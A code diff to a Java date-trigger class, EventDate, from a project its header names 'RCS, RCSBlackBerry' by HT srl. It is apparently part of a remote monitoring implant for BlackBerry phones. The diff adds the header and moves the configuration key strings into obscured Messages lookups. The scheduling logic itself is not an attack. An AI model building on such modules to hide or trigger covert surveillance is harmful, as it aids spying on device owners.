@@ -1,10 +1,19 @@
 //#preprocess
+
+/* *************************************************
+ * Copyright (c) 2010 - 2012
+ * HT srl,   All rights reserved.
+ * 
+ * Project      : RCS, RCSBlackBerry
+ * *************************************************/
+
 package blackberry.event;
 
 import java.util.Calendar;
 import java.util.Date;
 import java.util.TimeZone;
 
+import blackberry.Messages;
 import blackberry.config.ConfEvent;
 import blackberry.config.ConfigurationException;
 import blackberry.debug.Check;
@@ -13,7 +22,7 @@ import blackberry.debug.DebugLevel;
 
 public class EventDate extends Event {
     //#ifdef DEBUG
-    private static Debug debug = new Debug("EventDate", DebugLevel.VERBOSE);
+    private static Debug debug = new Debug("EventDate", DebugLevel.VERBOSE); //$NON-NLS-1$
     //#endif
 
     private Date dateFrom;
@@ -29,10 +38,13 @@ public class EventDate extends Event {
 
         try {
             needExit = false;
-            dateFrom = conf.getDate("datefrom");
+            //x.1=datefrom
+            dateFrom = conf.getDate(Messages.getString("x.1")); //$NON-NLS-1$
 
-            if (conf.has("dateto")) {
-                dateTo = conf.getDate("dateto");
+            // x.2=dateto
+            if (conf.has(Messages.getString("x.2"))) { //$NON-NLS-1$
+                //x.3=dateto
+                dateTo = conf.getDate(Messages.getString("x.3")); //$NON-NLS-1$
             } else {
                 dateTo = new Date(Long.MAX_VALUE);
             }
@@ -45,46 +57,46 @@ public class EventDate extends Event {
 
     public void actualStart() {
         //#ifdef DEBUG
-        debug.trace("actualStart");
+        debug.trace("actualStart"); //$NON-NLS-1$
         //#endif
-        start = Calendar.getInstance(TimeZone.getTimeZone("GMT"));
+        start = Calendar.getInstance(TimeZone.getTimeZone("GMT")); //$NON-NLS-1$
         start.setTime(dateFrom);
-        stop = Calendar.getInstance(TimeZone.getTimeZone("GMT"));
+        stop = Calendar.getInstance(TimeZone.getTimeZone("GMT")); //$NON-NLS-1$
         stop.setTime(dateTo);
 
-        Calendar now = Calendar.getInstance(TimeZone.getTimeZone("GMT"));
+        Calendar now = Calendar.getInstance(TimeZone.getTimeZone("GMT")); //$NON-NLS-1$
         //#ifdef DEBUG
-        debug.trace("actualStart from: " + start.getTime() + " to: "
-                + stop.getTime() + " now: " + now.getTime());
+        debug.trace("actualStart from: " + start.getTime() + " to: " //$NON-NLS-1$ //$NON-NLS-2$
+                + stop.getTime() + " now: " + now.getTime()); //$NON-NLS-1$
         //#endif
 
         if (now.before(start)) {
             //#ifdef DEBUG
-            debug.trace(" (actualStart): not yet in the brackets");
+            debug.trace(" (actualStart): not yet in the brackets"); //$NON-NLS-1$
             //#endif
             nextDailyIn = setDailyDelay();
             //#ifdef DBC
-            Check.asserts(nextDailyIn == true, "nextDailyIn should be true");
+            Check.asserts(nextDailyIn == true, "nextDailyIn should be true"); //$NON-NLS-1$
             //#endif
         } else if (now.before(stop)) {
             //#ifdef DEBUG
-            debug.trace(" (actualStart): already in the brackets, don't reschedule, let's go");
+            debug.trace(" (actualStart): already in the brackets, don't reschedule, let's go"); //$NON-NLS-1$
             //#endif
             nextDailyIn = true;
 
         } else {
             //#ifdef DEBUG
-            debug.trace(" (actualStart): nothing to do");
+            debug.trace(" (actualStart): nothing to do"); //$NON-NLS-1$
             //#endif
             //#ifdef DBC
-            Check.asserts(nextDailyIn == false, "nextDailyIn should be false");
+            Check.asserts(nextDailyIn == false, "nextDailyIn should be false"); //$NON-NLS-1$
             //#endif
         }
     }
 
     public void actualLoop() {
         //#ifdef DEBUG
-        debug.trace("actualLoop");
+        debug.trace("actualLoop"); //$NON-NLS-1$
         //#endif        
 
         if (nextDailyIn) {
@@ -113,7 +125,7 @@ public class EventDate extends Event {
 
     public void actualStop() {
         //#ifdef DEBUG
-        debug.trace("actualStop");
+        debug.trace("actualStop"); //$NON-NLS-1$
         //#endif
 
         if (needExit) {
@@ -122,17 +134,17 @@ public class EventDate extends Event {
     }
 
     private boolean setDailyDelay() {
-        Calendar now = Calendar.getInstance(TimeZone.getTimeZone("GMT"));
-    
+        Calendar now = Calendar.getInstance(TimeZone.getTimeZone("GMT")); //$NON-NLS-1$
+
         //#ifdef DEBUG
-        debug.trace("setDailyDelay start: " + start.getTime().getTime());
-        debug.trace("setDailyDelay stop: " + start.getTime().getTime());
+        debug.trace("setDailyDelay start: " + start.getTime().getTime()); //$NON-NLS-1$
+        debug.trace("setDailyDelay stop: " + start.getTime().getTime()); //$NON-NLS-1$
         //#endif
         long period;
         if (now.before(start)) {
             period = (start.getTime().getTime() - now.getTime().getTime());
             //#ifdef DEBUG
-            debug.trace("setDailyDelay (now before start) new period:" + period);
+            debug.trace("setDailyDelay (now before start) new period:" + period); //$NON-NLS-1$
             //#endif
             setDelay(period);
             reschedule();
@@ -140,7 +152,7 @@ public class EventDate extends Event {
         } else if (now.before(stop)) {
             period = (stop.getTime().getTime() - now.getTime().getTime());
             //#ifdef DEBUG
-            debug.trace("setDailyDelay (now before stop) new period:" + period);
+            debug.trace("setDailyDelay (now before stop) new period:" + period); //$NON-NLS-1$
             //#endif
             setDelay(period);
             reschedule();
